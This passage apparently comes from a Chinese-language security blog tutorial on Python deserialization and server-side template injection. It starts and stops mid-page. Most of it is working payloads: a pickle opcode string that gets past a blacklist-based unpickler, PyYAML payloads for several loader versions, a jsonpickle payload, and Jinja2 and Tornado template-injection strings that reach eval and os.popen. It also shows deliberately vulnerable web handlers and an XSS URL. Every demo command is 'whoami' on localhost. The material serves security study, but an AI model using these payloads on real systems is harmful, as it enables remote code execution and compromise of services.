class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    blacklist = &#123;<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&#x27;builtins&#x27;</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> <span class="variable language_">self</span>.blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(</span><br><span class="line">            <span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line">restricted_loads(<span class="string">b&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>题目并没有过滤getattr，我们可以通过该方法来获取到builtins下的eval等危险函数，一个常规的思路就是getattar(builtins, ‘eval’)，利用之前类继承方式来执行代码即可（魔术函数）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&quot;cbuiltins\ngetattr\n(cbuiltins\ndict\nVget\ntR(cbuiltins\nglobals\n(tRVbuiltins\ntRp1\ncbuiltins\ngetattr\n(g1\nVeval\ntR(V__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)\ntR.&quot;</span></span><br></pre></td></tr></table></figure><h4 id="PyYAML"><a href="#PyYAML" class="headerlink" title="PyYAML"></a>PyYAML</h4><p>yaml本身支持强制类型转化，强制转化为str类型就是!!str，五个功能强大的yaml标签，支持转化为指定的python模块，类，方法以及对象实例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">!!python/<span class="built_in">object</span>/new:module.cls<span class="comment"># module.cls instance  # 能够直接执行命令 </span></span><br><span class="line">!!python/<span class="built_in">object</span>/apply:module.f<span class="comment"># value of f(...)      # 能够直接执行命令 </span></span><br><span class="line">!!python/name:module.name<span class="comment"># module.name          # 需要特定条件才可以执行命令 </span></span><br><span class="line">!!python/module:package.module<span class="comment"># package.module       # 需要特定条件才可以执行命令 </span></span><br><span class="line">!!python/<span class="built_in">object</span>:module.cls<span class="comment"># module.cls instance  # 需要特定条件才可以执行命令 </span></span><br></pre></td></tr></table></figure><p><strong>PyYAML&lt;&#x3D;5.1</strong></p><p>序列化数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load(data)  <span class="comment"># 加载单个YAML配置，作用是将yaml类型数据转化为python对象包括自定义的对象实例、字典、列表等类型数据</span></span><br><span class="line">load(data, Loader=yaml.Loader)  <span class="comment"># 指定加载器有BaseLoader、SafeLoader</span></span><br><span class="line">load_all(data)  <span class="comment"># 加载多个YAML配置</span></span><br><span class="line">load_all(data, Loader=yaml.Loader)  <span class="comment"># 指定加载器</span></span><br></pre></td></tr></table></figure><p>Loader就是用来指定加载器</p><p>1.BaseConstructor：最最基础的构造器，不支持强制类型转换<br>2.SafeConstructor：集成 BaseConstructor，强制类型转换和 YAML 规范保持一致，没有魔改<br>3.Constructor：在 YAML 规范上新增了很多强制类型转换（5.1以下默认此加载器，很危险）</p><p>反序列化数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dump(data)  <span class="comment"># 接收的参数就是python对象包括对象实例、字典、列表等类型数据</span></span><br></pre></td></tr></table></figure><p><strong>五个complex标签的利用</strong></p><p>!!python&#x2F;object&#x2F;apply</p><p>进入yaml模块源码yaml&#x2F;constructor.py中，最终进入了find_python_name方法，通过__import__将模块导入进来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">yaml.load(<span class="string">&quot;!!python/object/apply:os.system [whoami]&quot;</span>)  <span class="comment"># 命令的单双引号加不加都可以</span></span><br><span class="line"></span><br><span class="line">yaml.load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">!!python/object/apply:os.system</span></span><br><span class="line"><span class="string">- whoami</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">yaml.load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">!!python/object/apply:os.system</span></span><br><span class="line"><span class="string">  args: [&quot;whoami&quot;]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>!!python&#x2F;object&#x2F;new</p><p>原理跟上面一样，最终进入了find_python_name方法，通过__import__将模块导入进来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">yaml.load(<span class="string">&quot;!!python/object/new:os.system [whoami]&quot;</span>)</span><br><span class="line"></span><br><span class="line">yaml.load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">!!python/object/new:os.system</span></span><br><span class="line"><span class="string">- whoami</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">yaml.load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">!!python/object/new:os.system</span></span><br><span class="line"><span class="string">  args: [&quot;whoami&quot;]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>!!python&#x2F;object、!!python&#x2F;module、!!python&#x2F;name</p><p>这三个不能直接执行命令的标签，条件允许其实有其他办法，比如利用现有文件上传或者写文件的功能，传入一个写入命令执行代码的文件。比如说同级目录下面有两个文件（同一个文件内用法同理）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># yaml_test.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><p>另一个文件里面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line">yaml.load(<span class="string">&quot;!!python/module:yaml_test&quot;</span> )</span><br><span class="line"><span class="comment"># 下面两条exp方法是随意写的，是不存在的，但必须要有，因为这是命名规则，不然会报错，主要是文件名yaml_test要写对。会执行但是执行完会报错。</span></span><br><span class="line">yaml.load(<span class="string">&quot;!!python/object:yaml_test.exp&quot;</span> )</span><br><span class="line">yaml.load(<span class="string">&quot;!!python/name:yaml_test.exp&quot;</span> )</span><br></pre></td></tr></table></figure><p>当然!!python&#x2F;object&#x2F;new和!!python&#x2F;object&#x2F;apply也可以用这种方式实现利用，同理会执行但是执行完会报错。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yaml.load(<span class="string">&#x27;!!python/object/apply:yaml_test.exp &#123;&#125;&#x27;</span> )</span><br><span class="line">yaml.load(<span class="string">&#x27;!!python/object/new:yaml_test.exp &#123;&#125;&#x27;</span> )</span><br></pre></td></tr></table></figure><p>如果不在同一目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">├── test_file.py</span><br><span class="line">└── uploads</span><br><span class="line">    └── yaml_test.py</span><br></pre></td></tr></table></figure><p>修改下payload，在文件名前加入目录名可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#经过测试只有modle标签可行</span></span><br><span class="line">yaml.load(<span class="string">&quot;!!python/module:uploads.yaml_test&quot;</span> )</span><br></pre></td></tr></table></figure><p>!!python&#x2F;object&#x2F;new和!!python&#x2F;object&#x2F;apply加个目录即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp表示着类实例，可以写成其他，虽不存在但是一定要有，否则报错</span></span><br><span class="line">yaml.load(<span class="string">&#x27;!!python/object/apply:uploads.exp &#123;&#125;&#x27;</span> )</span><br><span class="line">yaml.load(<span class="string">&#x27;!!python/object/new:uploads.exp &#123;&#125;&#x27;</span> )</span><br></pre></td></tr></table></figure><p><strong>PyYAML&gt;5.1</strong></p><p>这个版本中更新了一下方法，截止文章编写时PyYAML的最新版本为6，POC都可以使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">load(data) [works under certain conditions]</span><br><span class="line">load(data, Loader=Loader)</span><br><span class="line">load(data, Loader=UnsafeLoader)</span><br><span class="line">load(data, Loader=FullLoader)</span><br><span class="line">load_all(data) [works under certain condition]</span><br><span class="line">load_all(data, Loader=Loader)</span><br><span class="line">load_all(data, Loader=UnSafeLoader)</span><br><span class="line">load_all(data, Loader=FullLoader)</span><br><span class="line">full_load(data)</span><br><span class="line">full_load_all(data)</span><br><span class="line">unsafe_load(data)</span><br><span class="line">unsafe_load_all(data)</span><br></pre></td></tr></table></figure><p>在5.1之后的yaml中load函数被限制使用了，会被警告提醒加上一个参数 Loader</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.py:3: YAMLLoadWarning: calling yaml.load() without Loader=... is deprecated, as the default Loader is unsafe. Please <span class="built_in">read</span> https:</span><br></pre></td></tr></table></figure><p>针对不同的需要，选择不同的加载器，有以下几种加载器<br>1.BaseConstructor：仅加载最基本的YAML<br>2.SafeConstructor：安全加载Yaml语言的子集，建议用于加载不受信任的输入（safe_load)<br>3.FullConstructor：加载的模块必须位于 sys.modules 中（说明程序已经 import 过了才让加载）。这个是默认的加载器。<br>4.UnsafeConstructor（也称为Loader向后兼容性）：原始的Loader代码，可以通过不受信任的数据输入轻松利用（unsafe_load）<br>5.Constructor：等同于UnsafeConstructor</p><p>Fullloader加载模式的对漏洞利用的限制<br>如果不执行只是为了单纯导入模块，那么需要sys.modules字典中有我们的模块，否则报错</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yaml.constructor.ConstructorError: <span class="keyword">while</span> constructing a Python <span class="built_in">object</span></span><br><span class="line">module <span class="string">&#x27;subprocess&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> imported</span><br></pre></td></tr></table></figure><p>如果要执行，那么sys.modules字典中要有利用模块，并且加载进来的 module.name 必须是一个类而不能是方法，否则就会报错</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yaml.constructor.ConstructorError: <span class="keyword">while</span> constructing a Python instance</span><br><span class="line">expected a <span class="keyword">class</span>, but found &lt;<span class="keyword">class</span> <span class="string">&#x27;builtin_function_or_method&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>说人话就是：不在能够自动通过__import__将模块导入进来，需要使用内置函数或魔术函数方式来使用</p><p>那我们直接构造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tuple(map(eval, [&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;]))</span></span><br><span class="line"><span class="comment"># 变为yaml就是payload_1</span></span><br><span class="line"><span class="comment"># payload_1</span></span><br><span class="line">yaml.load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">!!python/object/new:tuple</span></span><br><span class="line"><span class="string">- !!python/object/new:map</span></span><br><span class="line"><span class="string">  - !!python/name:eval</span></span><br><span class="line"><span class="string">  - [&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>,Loader=yaml.Loader)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建了一个类型为z的新对象,而对象中extend属性在创建时会被调用,参数为listitems内的参数</span></span><br><span class="line"><span class="comment"># payload_2</span></span><br><span class="line">yaml.load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">!!python/object/new:type</span></span><br><span class="line"><span class="string">  args: [&quot;z&quot;, !!python/tuple [], &#123;&quot;extend&quot;: !!python/name:exec &#125;]</span></span><br><span class="line"><span class="string">  listitems: &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>,Loader=yaml.Loader)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># 报错但是执行了</span></span><br><span class="line"><span class="comment"># payload_3</span></span><br><span class="line">yaml.load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">- !!python/object/new:str</span></span><br><span class="line"><span class="string">    args: []</span></span><br><span class="line"><span class="string">    state: !!python/tuple</span></span><br><span class="line"><span class="string">    - &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span></span><br><span class="line"><span class="string">    - !!python/object/new:staticmethod</span></span><br><span class="line"><span class="string">      args: [0]</span></span><br><span class="line"><span class="string">      state:</span></span><br><span class="line"><span class="string">        update: !!python/name:exec</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>,Loader=yaml.Loader)</span><br><span class="line"><span class="comment"># payload_4</span></span><br><span class="line">yaml.load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">- !!python/object/new:yaml.MappingNode</span></span><br><span class="line"><span class="string">  listitems: !!str &#x27;!!python/object/apply:subprocess.Popen [whoami]&#x27;</span></span><br><span class="line"><span class="string">  state:</span></span><br><span class="line"><span class="string">    tag: !!str dummy</span></span><br><span class="line"><span class="string">    value: !!str dummy</span></span><br><span class="line"><span class="string">    extend: !!python/name:yaml.unsafe_load</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>,Loader=yaml.Loader)</span><br></pre></td></tr></table></figure><p><strong>Jsonpickle</strong></p><p>用于将任意对象序列化为JSON的Python库。Jsonpickle可以使用几乎所有Python对象并将该对象转换为JSON。另外，它可以将对象重新构造回Python。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jsonpickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EXP</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system, (<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line">poc = jsonpickle.encode(EXP())  <span class="comment"># 把实例化的类转换成json数据</span></span><br><span class="line"><span class="built_in">print</span>(poc)</span><br></pre></td></tr></table></figure><p>然后直接调用decode()函数来执行即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jsonpickle.decode(<span class="string">&quot;&quot;&quot;&#123;&quot;py/reduce&quot;: [&#123;&quot;py/function&quot;: &quot;os.system&quot;&#125;, &#123;&quot;py/tuple&quot;: [&quot;whoami&quot;]&#125;]&#125;&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>Marshal</strong></p><p>由于pickle不能序列化code对象，所以在python2.6后新增marshal来处理code对象的序列化。</p><p>这个包没办法直接执行命令，需要多方函数配合，有点鸡肋</p><p>如果直接dumps一个函数后然后再loads是没办法执行的，而是需要用到了 Python 的一个面向对象的特性，Python 能通过 types.FunctionTyle(func_code,globals(),’’)() 来动态地创建匿名函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle,base64</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> types</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fib</span>(<span class="params">n</span>):</span><br><span class="line">        <span class="keyword">if</span> n &lt;= <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        <span class="keyword">return</span> fib(n-<span class="number">1</span>) + fib(n-<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span> (fib(<span class="number">5</span>))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    pickle.dumps(foo.__code__)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line">code_serialized = base64.b64encode(marshal.dumps(foo.__code__))</span><br><span class="line">code_unserialized = marshal.loads(base64.b64decode(code_serialized))  <span class="comment"># 到这边都没发执行</span></span><br><span class="line">code_unserialized = types.FunctionType(code_unserialized, <span class="built_in">globals</span>(), <span class="string">&#x27;&#x27;</span>)()  <span class="comment"># 动态构造后才可以执行</span></span><br></pre></td></tr></table></figure><p>如果需要执行需要配合pickle.loads()函数，和opcode打组合拳来实现<br><strong>Shelve</strong><br>类似序列化一个函数一个定位的坐标，然后反序列化的时候加载这个坐标然后执行代码，必须要文件中有的代码才可以执行。相关的函数shelve.open()<br><strong>SSTI</strong><br>SSTI 就是服务器端模板注入（Server-Side Template Injection）漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。<br>推荐一个项目：<a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a><br><strong>Jinja2</strong><br>Jinja2是Flask框架的一部分。Jinja2会把模板参数提供的相应的值替换了块，只要使用到这个包的代码只要不注意处理都会照成漏洞，下面一django来举例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"><span class="comment"># http://127.0.0.1:9999/api/test/?name=&#123;&#123;11*10&#125;&#125;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">request</span>):</span><br><span class="line">    name = request.GET[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">    t = Template(<span class="string">&quot;Hello &quot;</span> + name)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(t.render())</span><br><span class="line">    <span class="comment"># 注入修复</span></span><br><span class="line">    <span class="comment"># t = Template(&quot;Hello &#123;&#123;n&#125;&#125;&quot;)</span></span><br><span class="line">    <span class="comment"># return t.render(n=name)</span></span><br></pre></td></tr></table></figure><p><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/python/2.8s33kjoc3u.jpg" alt="Alt pic"><br>然后我们可以利用之前上面所写的魔术方法方法来注入即可达成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2和python3通用代码</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line"><span class="keyword">if</span> c.__name__==<span class="string">&#x27;_IterationGuard&#x27;</span>:</span><br><span class="line">c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure><p>换成模板注入就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;_IterationGuard&#x27;</span> %&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>) &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/python/3.9dcr6uisek.jpg" alt="Alt pic"><br>或者换成__globals__模块来是用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="comment"># python2和python3通用代码 #&#125;</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/python/4.6ik3123ln2.jpg" alt="Alt pic"><br><strong>Tornado</strong></p><p>tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过进行传递变量和执行简单的表达式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.template</span><br><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line">TEMPLATE = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string"> &lt;head&gt;&lt;title&gt; Hello &#123;&#123; name &#125;&#125; &lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string"> &lt;body&gt; Hello ascotbe &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainHandler</span>(tornado.web.RequestHandler):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        name = <span class="variable language_">self</span>.get_argument(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        template_data = TEMPLATE.replace(<span class="string">&quot;ascotbe&quot;</span>,name)</span><br><span class="line">        t = tornado.template.Template(template_data)</span><br><span class="line">        <span class="variable language_">self</span>.write(t.generate(name=name))</span><br><span class="line"></span><br><span class="line">application = tornado.web.Application([</span><br><span class="line">    (<span class="string">r&quot;/&quot;</span>, MainHandler),</span><br><span class="line">], debug=<span class="literal">True</span>, static_path=<span class="literal">None</span>, template_path=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    application.listen(<span class="number">8000</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.instance().start()</span><br></pre></td></tr></table></figure><p>xss代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8000</span>/?name=hi%3Cimg%20src=<span class="number">1</span>%20onerror=alert(%22xss%<span class="number">22</span>);%3E</span><br></pre></td></tr></table></figure><p>注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8000</span>/?name=&#123;%<span class="keyword">import</span> os%&#125;&#123;&#123;os.popen(<span class="string">&quot;whoami&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>Mako</strong></p><p>mako 本身可以完美支持 Python 语句，所以利用 &lt;% %&gt;、&lt;%! %&gt;、${} 可以非常轻松地进行攻，还有进行结构控制的%for … : %endfor、%if … : … %elif: … % else: … %endif。自定义函数&lt;%def name&#x3D;”…” &gt; … &lt;&#x2F;%def&gt;，调用：${…()}。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 